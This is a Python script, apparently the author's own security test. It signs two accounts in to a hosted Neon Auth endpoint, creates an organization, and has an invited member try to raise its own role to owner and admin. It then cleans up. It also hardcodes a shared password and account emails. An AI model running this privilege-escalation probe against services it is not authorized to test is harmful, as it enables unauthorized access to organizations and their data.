# -*- coding: utf-8 -*-
"""org member 自提权最终闭环(顺序修正):
create -> invite -> accept(提取 member id) -> ★member 用自己 memberId 提权 -> 恢复/清理"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
PW = 'SecTest!2026pass2'
N12_EMAIL = 'libobo1229+secn12@gmail.com'

def login(email):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': PW}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in hdrs.get('set-cookie', '').split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

st, ck2 = login('libobo1229+na2@gmail.com')
st, ck12 = login('libobo1229+secn12@gmail.com')

# 1) create
st, raw = req(ck2, 'POST', '/organization/create', {'name': 'sec-o7-org', 'slug': 'sec-o7-org'})
org_id = json.loads(raw).get('id')
print('[1] org_id:', org_id, flush=True)

# 2) invite + accept -> member id
st, raw = req(ck2, 'POST', '/organization/invite-member',
              {'email': N12_EMAIL, 'role': 'member', 'organizationId': org_id})
inv_id = json.loads(raw).get('id')
st, raw = req(ck12, 'POST', '/organization/accept-invitation', {'invitationId': inv_id})
acc = json.loads(raw)
m12 = acc['member']['id']
print('[2] secn12 member id:', m12, flush=True)

# 3) ★ member 自提权
print('\n[3] ★ member(secn12) 自提权测试', flush=True)
for role in ['owner', 'admin']:
    st, raw = req(ck12, 'POST', '/organization/update-member-role',
                  {'memberId': m12, 'role': role, 'organizationId': org_id})
    print('  [self->%s] -> %d %s' % (role, st, raw[:220].replace('\n', ' ')), flush=True)
    time.sleep(0.3)

# 4) member 其他越权(用精确 member id)
print('\n[4] member 越权补充(member id 精确值)', flush=True)
# 移除 owner(owner 的 member id 从 create 响应拿——已丢失,再试 invite 时不会返回;直接忽略)
# member 尝试把 owner 降级:owner member id 未知,跳过;试 leave-org(正常功能)
st, raw = req(ck12, 'POST', '/organization/leave', {'organizationId': org_id})
print('  [member leave-org] -> %d %s' % (st, raw[:220].replace('\n', ' ')), flush=True)

# 5) 验证终态 + 恢复/清理
print('\n[5] 终态与清理', flush=True)
st, raw = req(ck2, 'GET', '/organization/list')
print('  na2 orgs:', st, raw[:300].replace('\n', ' '), flush=True)
st, raw = req(ck12, 'GET', '/organization/list')
print('  secn12 orgs:', st, raw[:300].replace('\n', ' '), flush=True)
st, raw = req(ck2, 'POST', '/organization/delete', {'organizationId': org_id})
print('  cleanup delete:', st, raw[:150].replace('\n', ' '), flush=True)
